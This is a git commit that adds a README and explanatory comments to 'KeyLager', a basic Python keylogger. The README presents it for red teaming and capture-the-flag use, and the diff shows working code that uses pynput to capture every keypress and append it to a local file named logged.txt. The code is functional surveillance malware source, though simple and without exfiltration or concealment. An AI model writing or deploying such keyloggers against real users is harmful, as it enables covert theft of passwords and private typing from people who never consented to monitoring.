0c640e8c78a19c599631db7fd92801a88b903997
Damien Vermaas <damien@fortytwo.nl>
2021-10-02 22:07:10 +0200

    Added a README and comments in the main script.

---
+++ README.md
@@ -0,0 +1,6 @@
+###KeyLager
+
+KeyLager is a basic keylogger made in Python. It takes note of every key that gets pressed once activated on a system.
+The main use of this keylogger is to be used in small sized Red Teaming operation, Capture the Flag challenges
+and other non-malicious operations where you might need a keylogger. 
+In the near future the functionalities of this script will be expanded to make it more useful for its intended purposes.
--- windows.py
+++ windows.py
@@ -1,10 +1,13 @@
+#importing pynput, a library that allows you to monitor input devices (mouse and keyboard).
 import pynput
 
 from pynput.keyboard import Key, Listener
 
+#Define two variables here that are used later throughout the script. Count is used to check the amount of characters typed. Keys is used to reset part of the logged.txt
 count= 0
 keys = []
 
+#The method that gets executed upon pressing a key, it registers the key here.
 def upon_press(key):
     global keys, count
 
@@ -17,12 +20,13 @@ def upon_press(key):
         save_log(keys)
         keys =[]
 
-
+#The method that gets executed upon releasing a key. If the key is anything but "escape", the program continues.
 def upon_release(key):
     if key == Key.esc:
         return False
 
 
+#Method used to save the registered
 def save_log(keys):
     with open("logged.txt", "a") as f:
         for key in keys:
@@ -32,6 +36,6 @@ def save_log(keys):
             elif k.find("Key") == -1:
                 f.write(k)
 
-
+#A basic listener to make sure everything actually gets picked up.
 with Listener(on_press=upon_press, on_release=upon_release) as listener:
     listener.join()
